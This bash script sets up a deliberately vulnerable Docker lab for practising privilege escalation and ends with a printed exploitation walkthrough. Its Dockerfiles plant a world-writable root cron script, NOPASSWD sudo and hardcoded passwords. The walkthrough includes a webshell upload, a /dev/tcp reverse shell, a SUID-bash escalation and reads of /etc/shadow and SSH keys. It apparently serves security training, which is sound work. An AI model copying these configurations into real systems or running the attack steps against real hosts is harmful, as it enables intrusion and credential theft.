#!/bin/bash

# ============================================================================
# CloudMints Vulnerable Lab - FINAL Complete Setup Script
# ============================================================================
# This script creates a fully working vulnerable privilege escalation lab
# ============================================================================

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m'

STEP=0
TOTAL_STEPS=10
DOCKER_CMD="docker"

print_header() {
    echo ""
    echo "════════════════════════════════════════════════════════════════════════"
    echo -e "${CYAN}$1${NC}"
    echo "════════════════════════════════════════════════════════════════════════"
    echo ""
}

print_step() {
    STEP=$((STEP + 1))
    echo ""
    echo -e "${BLUE}[$STEP/$TOTAL_STEPS] $1${NC}"
    echo "────────────────────────────────────────────────────────────────────────"
}

print_success() { echo -e "${GREEN}✓ $1${NC}"; }
print_error() { echo -e "${RED}✗ $1${NC}"; }
print_warning() { echo -e "${YELLOW}⚠ $1${NC}"; }
print_info() { echo -e "${CYAN}ℹ $1${NC}"; }

# ============================================================================
# Determine if sudo is needed
# ============================================================================

check_docker_sudo() {
    if docker ps &> /dev/null; then
        DOCKER_CMD="docker"
        print_success "Docker works without sudo"
    elif sudo docker ps &> /dev/null; then
        DOCKER_CMD="sudo docker"
        print_warning "Using sudo for Docker commands"
    else
        print_error "Docker is not accessible"
        return 1
    fi
    return 0
}

# ============================================================================
# STEP 1: System Check
# ============================================================================

check_system() {
    print_step "Checking system requirements"

    print_info "OS: $(uname -s), Kernel: $(uname -r), User: $(whoami)"

    if sudo -n true 2>/dev/null || sudo true 2>/dev/null; then
        print_success "Sudo access confirmed"
    else
        print_error "Sudo required"
        exit 1
    fi

    print_success "System check passed"
}

# ============================================================================
# STEP 2: Docker Check
# ============================================================================

check_docker() {
    print_step "Checking Docker installation"

    if ! command -v docker &> /dev/null; then
        print_error "Docker not installed"
        print_info "Install with: sudo apt-get install docker.io"
        exit 1
    fi

    print_success "Docker is installed"

    if ! sudo systemctl is-active --quiet docker; then
        print_info "Starting Docker daemon..."
        sudo systemctl start docker
        sleep 2
    fi

    print_success "Docker daemon running"
    check_docker_sudo
}

# ============================================================================
# STEP 3: Docker Compose (optional)
# ============================================================================

check_docker_compose() {
    print_step "Checking Docker Compose"

    if command -v docker-compose &> /dev/null; then
        print_success "Docker Compose installed"
    else
        print_warning "Docker Compose not found (optional)"
    fi
}

# ============================================================================
# STEP 4: Verify Files
# ============================================================================

verify_files() {
    print_step "Verifying required files"

    MISSING=()

    for dir in admin_app main_app dummy_files; do
        if [ -d "$dir" ]; then
            print_success "Found: $dir/"
        else
            print_error "Missing: $dir/"
            MISSING+=("$dir")
        fi
    done

    if [ ${#MISSING[@]} -ne 0 ]; then
        print_error "Missing required directories"
        exit 1
    fi

    # Check dummy files
    DUMMY_COUNT=$(find dummy_files -type f 2>/dev/null | wc -l)
    print_info "Dummy files: $DUMMY_COUNT"

    print_success "All directories verified"
}

# ============================================================================
# STEP 5: Create Vulnerable Script
# ============================================================================

create_vulnerable_script() {
    print_step "Creating vulnerable backup script"

    cat > backup_script.sh <<'EOFSCRIPT'
#!/bin/bash
# CloudMints Backup - Runs as root every 2 minutes
echo "[$(date)] Backup started" >> /var/log/backup.log
tar czf /tmp/backup_$(date +%Y%m%d_%H%M%S).tar.gz /home/cloudmints 2>/dev/null
echo "[$(date)] Backup completed" >> /var/log/backup.log
EOFSCRIPT

    chmod +x backup_script.sh
    print_success "Backup script created"
}

# ============================================================================
# STEP 6: Prepare Build Context
# ============================================================================

prepare_build_context() {
    print_step "Preparing build context for Docker"

    print_info "Copying resources to main_app..."
    cp -r dummy_files main_app/dummy_files_lab 2>/dev/null || mkdir -p main_app/dummy_files_lab
    cp backup_script.sh main_app/backup_script.sh 2>/dev/null || true
    print_success "Resources copied to main_app"

    print_info "Copying resources to admin_app..."
    cp -r dummy_files admin_app/dummy_files_lab 2>/dev/null || mkdir -p admin_app/dummy_files_lab
    cp backup_script.sh admin_app/backup_script.sh 2>/dev/null || true
    print_success "Resources copied to admin_app"
}

# ============================================================================
# STEP 7: Create Lab Dockerfiles
# ============================================================================

create_lab_dockerfiles() {
    print_step "Creating lab-specific Dockerfiles"

    # ========================================================================
    # Main App Dockerfile (nginx:alpine)
    # ========================================================================
    print_info "Creating main_app lab Dockerfile..."

    cat > main_app/Dockerfile.lab <<'EOFDOCKER'
FROM nginx:alpine

ENV DEBIAN_FRONTEND=noninteractive
ENV TZ=Asia/Kolkata

# Install all required packages including Python3
RUN apk add --no-cache \
    bash \
    dcron \
    python3 \
    py3-pip \
    sudo \
    vim \
    nano \
    wget \
    curl \
    netcat-openbsd \
    net-tools \
    procps \
    shadow \
    tzdata \
    busybox-suid

# Set timezone
RUN cp /usr/share/zoneinfo/Asia/Kolkata /etc/localtime && \
    echo "Asia/Kolkata" > /etc/timezone

# Create cloudmints user
RUN adduser -D -s /bin/bash cloudmints && \
    echo "cloudmints:cloudmints123" | chpasswd && \
    echo "cloudmints ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers

# Copy website files
COPY . /usr/share/nginx/html/

# Copy dummy files
COPY dummy_files_lab /home/cloudmints/
RUN chown -R cloudmints:cloudmints /home/cloudmints

# Copy vulnerable backup script
COPY backup_script.sh /opt/backup.sh
RUN chmod 777 /opt/backup.sh && \
    chown root:root /opt/backup.sh

# Setup cron job
RUN echo "*/2 * * * * /opt/backup.sh" > /etc/crontabs/root && \
    touch /var/log/backup.log && \
    touch /var/log/cron.log && \
    chmod 666 /var/log/backup.log && \
    chmod 666 /var/log/cron.log

# Create comprehensive start script
RUN echo '#!/bin/bash' > /start.sh && \
    echo 'set -e' >> /start.sh && \
    echo 'echo "=== CloudMints Lab Container Starting ==="' >> /start.sh && \
    echo 'echo "Starting cron daemon..."' >> /start.sh && \
    echo 'crond -b -L /var/log/cron.log' >> /start.sh && \
    echo 'sleep 1' >> /start.sh && \
    echo 'if pgrep crond > /dev/null; then' >> /start.sh && \
    echo '    echo "✓ Cron daemon started successfully"' >> /start.sh && \
    echo 'else' >> /start.sh && \
    echo '    echo "✗ Cron daemon failed to start"' >> /start.sh && \
    echo 'fi' >> /start.sh && \
    echo 'echo "Python version: $(python3 --version 2>&1)"' >> /start.sh && \
    echo 'echo "Backup script: $(ls -la /opt/backup.sh)"' >> /start.sh && \
    echo 'echo "Starting nginx..."' >> /start.sh && \
    echo 'nginx -g "daemon off;"' >> /start.sh && \
    chmod +x /start.sh

EXPOSE 80

CMD ["/start.sh"]
EOFDOCKER

    print_success "Main app lab Dockerfile created"

    # ========================================================================
    # Admin App Dockerfile (PHP 8.2 with Apache)
    # ========================================================================
    print_info "Creating admin_app lab Dockerfile..."

    cat > admin_app/Dockerfile.lab <<'EOFDOCKER'
FROM php:8.2-apache

ENV DEBIAN_FRONTEND=noninteractive
ENV TZ=Asia/Kolkata

# Install all required packages including Python3
RUN apt-get update && \
    ln -snf /usr/share/zoneinfo/Asia/Kolkata /etc/localtime && \
    echo "Asia/Kolkata" > /etc/timezone && \
    apt-get install -y \
        cron \
        python3 \
        python3-pip \
        sudo \
        vim \
        nano \
        wget \
        curl \
        netcat-traditional \
        net-tools \
        procps \
        iproute2 \
        iputils-ping && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/*

# Create symlink for python (so both python and python3 work)
RUN ln -s /usr/bin/python3 /usr/bin/python

# Create cloudmints user
RUN useradd -m -s /bin/bash cloudmints && \
    echo "cloudmints:cloudmints123" | chpasswd && \
    usermod -aG sudo cloudmints && \
    echo "cloudmints ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers

# Copy application files
COPY . /var/www/html/

# Copy dummy files
COPY dummy_files_lab /home/cloudmints/
RUN chown -R cloudmints:cloudmints /home/cloudmints

# Copy vulnerable backup script
COPY backup_script.sh /opt/backup.sh
RUN chmod 777 /opt/backup.sh && \
    chown root:root /opt/backup.sh

# Setup cron job
RUN echo "*/2 * * * * root /opt/backup.sh" > /etc/cron.d/cloudmints-backup && \
    chmod 644 /etc/cron.d/cloudmints-backup && \
    touch /var/log/backup.log && \
    touch /var/log/cron.log && \
    chmod 666 /var/log/backup.log && \
    chmod 666 /var/log/cron.log

# Setup uploads directory
RUN mkdir -p /var/www/html/uploads && \
    chown -R www-data:www-data /var/www/html && \
    chmod -R 755 /var/www/html && \
    chmod 777 /var/www/html/uploads

# Create comprehensive start script
RUN echo '#!/bin/bash' > /start.sh && \
    echo 'set -e' >> /start.sh && \
    echo 'echo "=== CloudMints Admin Panel Starting ==="' >> /start.sh && \
    echo 'echo "Starting cron service..."' >> /start.sh && \
    echo 'service cron start' >> /start.sh && \
    echo 'sleep 1' >> /start.sh && \
    echo 'if service cron status > /dev/null 2>&1; then' >> /start.sh && \
    echo '    echo "✓ Cron service started successfully"' >> /start.sh && \
    echo 'else' >> /start.sh && \
    echo '    echo "✗ Cron service failed to start"' >> /start.sh && \
    echo '    echo "Attempting alternative cron start..."' >> /start.sh && \
    echo '    cron' >> /start.sh && \
    echo 'fi' >> /start.sh && \
    echo 'echo "Python version: $(python3 --version 2>&1)"' >> /start.sh && \
    echo 'echo "Python symlink: $(python --version 2>&1)"' >> /start.sh && \
    echo 'echo "Backup script: $(ls -la /opt/backup.sh)"' >> /start.sh && \
    echo 'echo "Cron jobs:"' >> /start.sh && \
    echo 'cat /etc/cron.d/cloudmints-backup' >> /start.sh && \
    echo 'echo "Starting Apache..."' >> /start.sh && \
    echo 'apache2-foreground' >> /start.sh && \
    chmod +x /start.sh

EXPOSE 80

CMD ["/start.sh"]
EOFDOCKER

    print_success "Admin app lab Dockerfile created"
}

# ============================================================================
# STEP 8: Stop Existing Containers
# ============================================================================

stop_existing_containers() {
    print_step "Cleaning up existing containers"

    CONTAINERS=$($DOCKER_CMD ps -aq --filter "name=cloudmints" 2>/dev/null || echo "")

    if [ ! -z "$CONTAINERS" ]; then
        print_info "Stopping containers..."
        echo "$CONTAINERS" | xargs -r $DOCKER_CMD stop 2>/dev/null || true
        echo "$CONTAINERS" | xargs -r $DOCKER_CMD rm 2>/dev/null || true
        print_success "Containers removed"
    else
        print_info "No existing containers"
    fi

    # Remove old images
    $DOCKER_CMD rmi cloudmints-main:latest 2>/dev/null || true
    $DOCKER_CMD rmi cloudmints-admin:latest 2>/dev/null || true
}

# ============================================================================
# STEP 9: Build Images
# ============================================================================

build_images() {
    print_step "Building Docker images"

    # Build main app
    print_info "Building main_app (nginx:alpine)..."
    cd main_app
    if $DOCKER_CMD build -f Dockerfile.lab -t cloudmints-main:latest . ; then
        print_success "Main app built successfully"
    else
        print_error "Main app build failed"
        cd ..
        exit 1
    fi
    cd ..

    # Build admin app
    print_info "Building admin_app (PHP 8.2)..."
    cd admin_app
    if $DOCKER_CMD build -f Dockerfile.lab -t cloudmints-admin:latest . ; then
        print_success "Admin app built successfully"
    else
        print_error "Admin app build failed"
        cd ..
        exit 1
    fi
    cd ..

    # Verify images
    print_info "Verifying images..."
    MAIN_ID=$($DOCKER_CMD images -q cloudmints-main:latest)
    ADMIN_ID=$($DOCKER_CMD images -q cloudmints-admin:latest)

    if [ ! -z "$MAIN_ID" ] && [ ! -z "$ADMIN_ID" ]; then
        print_success "Both images created successfully"
        echo ""
        $DOCKER_CMD images | grep -E "REPOSITORY|cloudmints"
    else
        print_error "Image verification failed"
        exit 1
    fi
}

# ============================================================================
# STEP 10: Deploy
# ============================================================================

deploy_applications() {
print_step "Ensuring /etc/hosts contains lab domain entries"
HOSTS_DOMAINS_ADDED=0
for domain in cloudmints.in admin.cloudmints.in; do
    if grep -q "$domain" /etc/hosts; then
        print_success "$domain already exists in /etc/hosts"
    else
        print_info "Adding $domain to /etc/hosts"
        echo "127.0.0.1 $domain" | sudo tee -a /etc/hosts > /dev/null
        HOSTS_DOMAINS_ADDED=1
    fi
done
if [ $HOSTS_DOMAINS_ADDED -eq 1 ]; then
    print_success "All lab domains present in /etc/hosts"
fi
print_step "Pulling nginx-proxy Docker image"
$DOCKER_CMD pull nginxproxy/nginx-proxy
print_step "Starting nginx-proxy reverse proxy (port 80)"
if $DOCKER_CMD ps | grep -q nginx-proxy; then
    print_info "nginx-proxy already running"
else
    $DOCKER_CMD run -d         --name nginx-proxy         --restart unless-stopped         -p 80:80         -v /var/run/docker.sock:/tmp/docker.sock:ro         nginxproxy/nginx-proxy
    print_success "nginx-proxy started"
fi
print_step "Starting main_app (VIRTUAL_HOST=cloudmints.in, no port mapping)"
$DOCKER_CMD run -d     --name cloudmints-main     --restart unless-stopped     -e VIRTUAL_HOST=cloudmints.in     cloudmints-main:latest
print_step "Starting admin_app (VIRTUAL_HOST=admin.cloudmints.in, no port mapping)"
$DOCKER_CMD run -d     --name cloudmints-admin     --restart unless-stopped     -e VIRTUAL_HOST=admin.cloudmints.in     cloudmints-admin:latest

}

# ============================================================================
# STEP 11: Comprehensive Verification
# ============================================================================

verify_deployment() {
    print_step "Verifying deployment and vulnerable configuration"

    echo ""
    print_info "Running comprehensive checks..."
    echo ""

    # Check web accessibility
    sleep 3

    if curl -s -m 5 http://cloudmints.in > /dev/null 2>&1; then
        print_success "Main website: http://cloudmints.in ✓"
    else
        print_warning "Main website not responding yet"
    fi

    if curl -s -m 5 http://admin.cloudmints.in > /dev/null 2>&1; then
        print_success "Admin panel: http://admin.cloudmints.in ✓"
    else
        print_warning "Admin panel not responding yet"
    fi

    echo ""
    print_info "MAIN CONTAINER VERIFICATION:"
    echo "─────────────────────────────────────────────"

    # Python check
    if $DOCKER_CMD exec cloudmints-main python3 --version &>/dev/null; then
        PY_VER=$($DOCKER_CMD exec cloudmints-main python3 --version 2>&1)
        print_success "Python3: $PY_VER"
    else
        print_error "Python3: NOT FOUND"
    fi

    # Cron check
    if $DOCKER_CMD exec cloudmints-main pgrep crond > /dev/null 2>&1; then
        print_success "Cron: RUNNING"
    else
        print_error "Cron: NOT RUNNING"
    fi

    # Backup script check
    if $DOCKER_CMD exec cloudmints-main test -f /opt/backup.sh 2>/dev/null; then
        PERMS=$($DOCKER_CMD exec cloudmints-main stat -c %a /opt/backup.sh 2>/dev/null)
        OWNER=$($DOCKER_CMD exec cloudmints-main stat -c %U /opt/backup.sh 2>/dev/null)
        print_success "Backup script: EXISTS (perms: $PERMS, owner: $OWNER)"
    else
        print_error "Backup script: NOT FOUND"
    fi

    echo ""
    print_info "ADMIN CONTAINER VERIFICATION:"
    echo "─────────────────────────────────────────────"

    # Python check
    if $DOCKER_CMD exec cloudmints-admin python3 --version &>/dev/null; then
        PY_VER=$($DOCKER_CMD exec cloudmints-admin python3 --version 2>&1)
        print_success "Python3: $PY_VER"
    else
        print_error "Python3: NOT FOUND"
    fi

    # Python symlink
    if $DOCKER_CMD exec cloudmints-admin python --version &>/dev/null; then
        print_success "Python symlink: WORKING"
    else
        print_warning "Python symlink: NOT WORKING"
    fi

    # Cron check
    if $DOCKER_CMD exec cloudmints-admin pgrep cron > /dev/null 2>&1; then
        print_success "Cron: RUNNING"
    else
        print_error "Cron: NOT RUNNING"
    fi

    # Backup script check
    if $DOCKER_CMD exec cloudmints-admin test -f /opt/backup.sh 2>/dev/null; then
        PERMS=$($DOCKER_CMD exec cloudmints-admin stat -c %a /opt/backup.sh 2>/dev/null)
        OWNER=$($DOCKER_CMD exec cloudmints-admin stat -c %U /opt/backup.sh 2>/dev/null)
        print_success "Backup script: EXISTS (perms: $PERMS, owner: $OWNER)"
    else
        print_error "Backup script: NOT FOUND"
    fi

    # Dummy files
    FILE_COUNT=$($DOCKER_CMD exec cloudmints-admin find /home/cloudmints -type f 2>/dev/null | wc -l || echo "0")
    if [ $FILE_COUNT -gt 0 ]; then
        print_success "Dummy files: $FILE_COUNT files found"
    else
        print_warning "Dummy files: NONE FOUND"
    fi

    echo ""
}

# ============================================================================
# Display Final Information
# ============================================================================

display_final_info() {
    print_header "CloudMints Vulnerable Lab - Setup Complete!"

    echo -e "${GREEN}✅ Lab is fully operational and ready for exploitation!${NC}"
    echo ""

    echo -e "${CYAN}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║                    ACCESS INFORMATION                      ║${NC}"
    echo -e "${CYAN}╚════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "  ${BLUE}🌐 Main Website:${NC}  http://cloudmints.in"
    echo -e "  ${BLUE}🔐 Admin Panel:${NC}   http://admin.cloudmints.in"
    echo -e "     ${MAGENTA}Username:${NC}      admin"
    echo -e "     ${MAGENTA}Password:${NC}      CloudM1nts@Admin2024!"
    echo ""

    echo -e "${CYAN}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║                 VULNERABILITY DETAILS                      ║${NC}"
    echo -e "${CYAN}╚════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "  ${YELLOW}👤 Target User:${NC}        cloudmints"
    echo -e "  ${YELLOW}📁 Home Directory:${NC}     /home/cloudmints"
    echo -e "  ${YELLOW}⚠️  Vulnerable Script:${NC}  /opt/backup.sh"
    echo -e "  ${YELLOW}🔓 Permissions:${NC}        777 (world-writable)"
    echo -e "  ${YELLOW}👑 Owner:${NC}              root"
    echo -e "  ${YELLOW}⏰ Execution:${NC}          Every 2 minutes via cron"
    echo ""

    echo -e "${CYAN}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║              EXPLOITATION WALKTHROUGH                      ║${NC}"
    echo -e "${CYAN}╚════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${BLUE}STEP 1: Initial Access${NC}"
    echo "  • Navigate to http://admin.cloudmints.in"
    echo "  • Login with admin/CloudM1nts@Admin2024!"
    echo "  • Upload PHP webshell via file upload"
    echo ""
    echo -e "${BLUE}STEP 2: Get Reverse Shell${NC}"
    echo "  • Set up listener: nc -lvnp 9001"
    echo "  • Execute reverse shell from webshell"
    echo "  • Command: bash -c 'bash -i >& /dev/tcp/YOUR_IP/9001 0>&1'"
    echo ""
    echo -e "${BLUE}STEP 3: Upgrade Shell${NC}"
    echo "  $ python3 -c 'import pty; pty.spawn("/bin/bash")'"
    echo "  $ export TERM=xterm"
    echo "  $ Ctrl + Z"
    echo "  $ stty raw -echo; fg"
    echo "  $ stty rows 38 columns 116"
    echo ""
    echo -e "${BLUE}STEP 4: Enumerate${NC}"
    echo "  $ id"
    echo "  $ whoami"
    echo "  $ ps aux | grep cron"
    echo "  $ find / -type f -perm -002 -user root 2>/dev/null"

    echo ""
    echo -e "${BLUE}STEP 5: Exploit Cron Job (SUID Method)${NC}"
    echo "  $ echo '#!/bin/bash' > /opt/backup.sh"
    echo "  $ echo 'cp /bin/bash /tmp/rootbash' >> /opt/backup.sh"
    echo "  $ echo 'chmod +s /tmp/rootbash' >> /opt/backup.sh"
    echo "  $ chmod +x /opt/backup.sh"
    echo ""
    echo -e "${BLUE}STEP 6: Verify Exploit${NC}"
    echo "  $ cat /opt/backup.sh"
    echo ""
    echo -e "${BLUE}STEP 7: Wait for Cron (2 minutes)${NC}"
    echo "  $ watch -n 5 'ls -la /tmp/rootbash 2>/dev/null'"
    echo "  # Or just wait 120 seconds"
    echo ""
    echo -e "${BLUE}STEP 8: Execute SUID Bash${NC}"
    echo "  $ /tmp/rootbash -p"
    echo ""
    echo -e "${BLUE}STEP 9: Verify Root Access${NC}"
    echo "  # whoami"
    echo "  root"
    echo "  # id"
    echo "  uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) ..."
    echo ""
    echo -e "${BLUE}STEP 10: Post-Exploitation${NC}"
    echo "  # cat /home/cloudmints/*"
    echo "  # cat /root/.ssh/id_rsa"
    echo "  # cat /etc/shadow"
    echo ""

    echo -e "${CYAN}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║                 DEBUGGING COMMANDS                         ║${NC}"
    echo -e "${CYAN}╚════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${BLUE}Access Container Shell:${NC}"
    echo "  $DOCKER_CMD exec -it cloudmints-admin /bin/bash"
    echo "  $DOCKER_CMD exec -it cloudmints-main /bin/bash"
    echo ""
    echo -e "${BLUE}Check Cron Status:${NC}"
    echo "  $DOCKER_CMD exec cloudmints-admin ps aux | grep cron"
    echo "  $DOCKER_CMD exec cloudmints-admin service cron status"
    echo ""
    echo -e "${BLUE}View Logs:${NC}"
    echo "  $DOCKER_CMD logs -f cloudmints-admin"
    echo "  $DOCKER_CMD exec cloudmints-admin tail -f /var/log/backup.log"
    echo "  $DOCKER_CMD exec cloudmints-admin tail -f /var/log/cron.log"
    echo ""
    echo -e "${BLUE}Test Backup Script Manually:${NC}"
    echo "  $DOCKER_CMD exec cloudmints-admin /opt/backup.sh"
    echo "  $DOCKER_CMD exec cloudmints-admin cat /var/log/backup.log"
    echo ""
    echo -e "${BLUE}Check Python:${NC}"
    echo "  $DOCKER_CMD exec cloudmints-admin python3 --version"
    echo "  $DOCKER_CMD exec cloudmints-admin python --version"
    echo "  $DOCKER_CMD exec cloudmints-admin which python3"
    echo ""
    echo -e "${BLUE}Stop Lab:${NC}"
    echo "  $DOCKER_CMD stop cloudmints-main cloudmints-admin"
    echo "  $DOCKER_CMD rm cloudmints-main cloudmints-admin"
    echo ""
    echo -e "${BLUE}Restart Lab:${NC}"
    echo "  ./setup_cloudmints_lab.sh"
    echo ""

    echo -e "${CYAN}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║                  TROUBLESHOOTING TIPS                      ║${NC}"
    echo -e "${CYAN}╚════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${YELLOW}If Python not found in shell:${NC}"
    echo "  • Try: python3 (not python)"
    echo "  • Check: which python3"
    echo "  • Path: /usr/bin/python3"
    echo ""
    echo -e "${YELLOW}If cron not executing:${NC}"
    echo "  • Verify cron running: ps aux | grep cron"
    echo "  • Check cron config: cat /etc/cron.d/cloudmints-backup"
    echo "  • View cron logs: tail -f /var/log/cron.log"
    echo "  • Manual test: /opt/backup.sh"
    echo ""
    echo -e "${YELLOW}If privilege escalation fails:${NC}"
    echo "  • Verify script is writable: ls -la /opt/backup.sh"
    echo "  • Check script owner is root: stat /opt/backup.sh"
    echo "  • Ensure permissions are 777: chmod 777 /opt/backup.sh"
    echo "  • Wait full 2 minutes for cron"
    echo ""

    echo -e "${CYAN}════════════════════════════════════════════════════════════${NC}"
    echo -e "${GREEN}🎓 Lab Ready! Happy Hacking!${NC}"
    echo -e "${CYAN}════════════════════════════════════════════════════════════${NC}"
    echo ""
}

# ============================================================================
# Main Execution
# ============================================================================

main() {
    clear
    print_header "CloudMints Vulnerable Lab - Automated Setup"
    echo -e "${CYAN}Version: Final Production Release${NC}"
    echo -e "${CYAN}Features: Full Python3 Support + Working Cron + PHP 8.2${NC}"
    echo ""

    check_system
    check_docker
    check_docker_compose
    verify_files
    create_vulnerable_script
    prepare_build_context
    create_lab_dockerfiles
    stop_existing_containers
    build_images
    deploy_applications
    verify_deployment
    display_final_info
}

# Run main function
main
